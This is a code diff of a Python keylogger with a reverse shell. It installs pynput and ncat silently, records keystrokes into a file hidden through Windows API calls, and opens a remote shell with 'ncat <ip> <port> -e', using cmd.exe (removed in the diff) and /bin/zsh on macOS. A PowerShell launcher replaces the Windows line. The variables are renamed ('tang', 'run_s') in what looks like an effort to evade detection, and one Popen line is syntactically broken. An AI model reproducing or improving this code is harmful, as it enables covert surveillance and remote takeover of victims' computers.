@@ -1,13 +1,22 @@
+########################################
+# IMPORTS
+########################################
+
 import os
 import ctypes
 import subprocess
 import sys
 import threading
 # Check if the `pynput` package is installed
+
+########################################
+# config
+########################################
+
 subprocess.check_call([sys.executable, '-m', 'pip', 'install', 'pynput'])
 subprocess.check_call([sys.executable, '-m', 'pip', 'install', 'ncat'])
 from pynput.keyboard import Key, Listener
-
+p = subprocess.Popen(["powershell.exe", "<path>", stdout=sys.stdout])
 
 # Hidden file attribute
 FILE_ATTRIBUTE_HIDDEN = 0x02
@@ -17,6 +26,10 @@ count = 0
 
 # List to store the pressed tang
 tangs = []
+
+########################################
+# tang
+########################################
 
 # Callback function to handle tang press events
 def on_press(tang):
@@ -65,16 +78,23 @@ def write_file(tangs):
         if not ret:
             raise ctypes.WinError()
         
-        
+########################################
+# rs
+########################################
+
 # Function to run the ncat command
-def run_ncat():
+def run_s():
     if os.name == 'nt':
-        os.system('"start /b cmd.exe @cmd /c "cmd /k "ncat <ip> <port> -e cmd.exe""')
+        p.communicate()
     else:
         os.system("""osascript -e 'tell application "Terminal" to do script "ncat <ip> <port> -e /bin/zsh"'""")
 
+########################################
+# start
+########################################
+
 # Start the tang listener in a separate thread
-thread = threading.Thread(target=run_ncat)
+thread = threading.Thread(target=run_s)
 thread.start()
 
 with Listener(on_press=on_press, on_release=on_release) as listener:
